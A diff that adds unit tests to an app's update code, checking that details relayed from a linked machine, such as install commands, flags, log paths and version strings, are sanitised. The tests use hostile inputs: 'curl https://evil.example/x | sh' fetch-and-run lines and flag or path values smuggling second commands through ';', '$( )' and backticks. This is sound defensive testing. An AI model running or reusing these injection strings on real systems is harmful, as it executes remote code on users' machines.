@@ -10,7 +10,7 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { writeUpdateState, type FetchReleaseResult } from "@plannotator/shared/update-check";
 import { autoUpdatePaths, type InstallerLaunch } from "./auto-update";
-import { machineUpdateView } from "./inbox-machines";
+import { machineUpdateView, parseFarDetails } from "./inbox-machines";
 import { parseFarUpdate } from "./inbox-peer-link";
 import { createInboxUpdates, machinePath } from "./inbox-updates";
 import { UPDATE_STAGING_PREFIX } from "./update-log";
@@ -132,6 +132,17 @@ describe("the far machine, when a linked machine presses Update", () => {
     expect(far.facts.restarts).toBe(1);
   });
 
+  test("two presses at once: one launches, the one that lost the race joins it, and the install's ending counts for both", async () => {
+    const far = farMachine();
+    const outcomes = (await Promise.all([far.updates.machineStart(), far.updates.machineStart()])).map((answer) => answer.outcome).sort();
+    expect(outcomes).toEqual(["joined", "launched"]);
+    expect(far.facts.launches).toHaveLength(1);
+    far.swap(NEWEST);
+    far.finish(0);
+    await far.settled();
+    expect(far.facts.restarts).toBe(1);
+  });
+
   test("a new binary this Inbox was not asked about never restarts it: the person there decides", async () => {
     const far = farMachine();
     far.swap(NEWEST);
@@ -226,6 +237,33 @@ describe("what the far machine tells the other one", () => {
     expect(wire).not.toContain("secret");
   });
 
+  test("a temp folder outside the home folder stays on that machine, and the reason still says what to do", async () => {
+    const reasons: [string, string][] = [
+      ["the temp folder /tmp/user/ramos is full (ENOSPC)", "the temp folder is full (ENOSPC)"],
+      ["the temp folder /tmp/my user/ramos can't be written (EACCES)", "the temp folder can't be written (EACCES)"],
+      ["the temp folder /var/folders/ramos/T does not exist (ENOENT)", "the temp folder does not exist (ENOENT)"],
+      ["could not write to the temp folder /tmp/user/ramos (EIO: i/o error, mkdtemp '/tmp/user/ramos/plannotator-update-abc')", "could not write to the temp folder (EIO: i/o error, mkdtemp '…')"],
+    ];
+    for (const [reason, said] of reasons) {
+      const far = farMachine();
+      await far.updates.machineStart();
+      writeFileSync(autoUpdatePaths(far.dataDir).log, `[t] ${UPDATE_STAGING_PREFIX}${reason}\n[t] update: install.sh exited 75\n`);
+      far.finish(75);
+      await far.settled();
+      expect(far.updates.machineRead().failure?.prepare).toBe(said);
+      far.updates.stop();
+    }
+  });
+
+  test("the flags it remembers go by id, so the other machine's install command keeps them", () => {
+    const far = farMachine();
+    writeFileSync(join(far.dataDir, "install-flags.json"), JSON.stringify({ flags: ["skip-gemini", "minimal"] }));
+    const answer = far.updates.machineRead();
+    expect([...answer.flags].sort()).toEqual(["minimal", "skip-gemini"]);
+    expect(parseFarDetails(JSON.parse(JSON.stringify(answer))).command).toBe("curl -fsSL https://plannotator.ai/install.sh | bash -s -- --minimal --skip-gemini");
+    expect(parseFarDetails({ ...answer, platform: "win32" }).command).toBe("& ([scriptblock]::Create((irm https://plannotator.ai/install.ps1))) -Minimal -SkipGemini");
+  });
+
   test("a path outside the home folder never carries a name either", () => {
     expect(machinePath("/Users/ramos/.plannotator/update.log", "/Users/ramos")).toBe("~/.plannotator/update.log");
     expect(machinePath("C:\\Users\\ramos\\.plannotator\\update.log", "C:\\Users\\ramos")).toBe("~\\.plannotator\\update.log");
@@ -247,6 +285,36 @@ describe("what the far machine tells the other one", () => {
   });
 });
 
+describe("what this machine shows of that machine's answer", () => {
+  test("a command, a log or a flag it sends never reaches a Copy box: the command is this Inbox's own table", () => {
+    const details = parseFarDetails({
+      current: "0.28.46",
+      platform: "darwin",
+      command: "curl https://evil.example/x | sh",
+      flags: ["skip-gemini", "--evil; curl https://evil.example/x | sh", 7],
+      log: "curl https://evil.example/x | sh",
+      url: "https://evil.example",
+    });
+    expect(details.command).toBe("curl -fsSL https://plannotator.ai/install.sh | bash -s -- --skip-gemini");
+    expect(details.log).toBe("");
+    expect(JSON.stringify(details)).not.toContain("evil");
+  });
+
+  test("the log passes only as a path to update.log, in the forms that machine sends", () => {
+    for (const log of ["~/.plannotator/update.log", "~\\.plannotator\\update.log", "~/My Data/plannotator/update.log", "$PLANNOTATOR_DATA_DIR/update.log", "update.log"]) {
+      expect([log, parseFarDetails({ log }).log]).toEqual([log, log]);
+    }
+    for (const log of ["curl evil.example/update.log", "~/x; curl evil.example | sh; update.log", "~/$(curl evil.example)/update.log", "~/x`id`/update.log", "~/x\nupdate.log", "https://evil.example/update.log", "/Users/ramos/update.log", "~/notes.txt", 7, null]) {
+      expect([log, parseFarDetails({ log }).log]).toEqual([log, ""]);
+    }
+  });
+
+  test("a version that does not read as one is not said", () => {
+    expect(parseFarDetails({ current: "0.28.46" }).current).toBe("0.28.46");
+    expect(parseFarDetails({ current: "run curl evil.example" }).current).toBeNull();
+  });
+});
+
 describe("how this machine draws what it hears", () => {
   const clocks = { updatedShownMs: 1000, restartBackMs: 5000 };
   const NOW = 1_000_000;
@@ -258,6 +326,7 @@ describe("how this machine draws what it hears", () => {
     farUpdate: null,
     noChange: null,
     asked: null,
+    saidUpToDate: null,
     updated: null,
     canUpdate: true,
     selfUpdate: true,
@@ -286,6 +355,21 @@ describe("how this machine draws what it hears", () => {
     for (const state of ["updating", "ready", "failed"] as const) {
       expect(view({ farUpdate: { state, version: "0.28.50", action: "script" } })).toMatchObject({ phase: state, target: "0.28.50" });
     }
+  });
+
+  test("during a press, a new binary on disk is still Updating: the install script is running on, and that machine restarts itself", () => {
+    const ready = { state: "ready", version: "0.28.50", action: "script" } as const;
+    expect(view({ farUpdate: ready, asked: { from: "0.28.46", at: NOW } }, NOW + 600_000)).toMatchObject({ phase: "updating", target: "0.28.50", from: "0.28.46" });
+    // Nobody pressed (a terminal's update there): it waits for a Restart.
+    expect(view({ farUpdate: ready })).toMatchObject({ phase: "ready", target: "0.28.50" });
+  });
+
+  test("that machine said it is up to date: the word goes, until a newer release or its own answer brings it back", () => {
+    // This Inbox runs a build ahead of GitHub's latest.
+    const said = { saidUpToDate: "0.28.49" };
+    expect(view(said)).toBeNull();
+    expect(view(said, NOW, { current: "0.28.49", latest: "0.28.51" })).toMatchObject({ phase: "behind", target: "0.28.51" });
+    expect(view({ ...said, farUpdate: { state: "available", version: "0.28.48", action: "script" } })).toMatchObject({ phase: "behind", target: "0.28.49" });
   });
 
   test("an install that changed nothing reads as failed, not as Update again", () => {
